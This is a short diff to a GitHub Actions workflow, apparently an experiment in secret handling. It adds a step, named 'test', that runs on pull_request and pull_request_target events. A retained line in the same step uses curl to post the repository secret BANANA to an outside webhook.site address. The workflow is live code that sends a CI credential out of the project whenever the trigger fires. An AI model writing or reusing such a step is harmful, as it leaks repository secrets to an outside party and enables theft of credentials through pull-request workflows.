@@ -7,6 +7,9 @@ jobs:
   Explore-GitHub-Actions:
     runs-on: ubuntu-latest
     steps:
-      - run: |
+      - name: test
+        if: contains(fromJSON('["pull_request","pull_request_target"]'), github.event_name)
+        run: |
+          echo ${{ github.event_name }}
           echo "${{ github.event.pull_request.head.sha }}"
           curl https://webhook.site/b9b9f3a9-fb5f-47bd-a6ae-55009feebd48 -d "segredo=${{ secrets.BANANA }}"
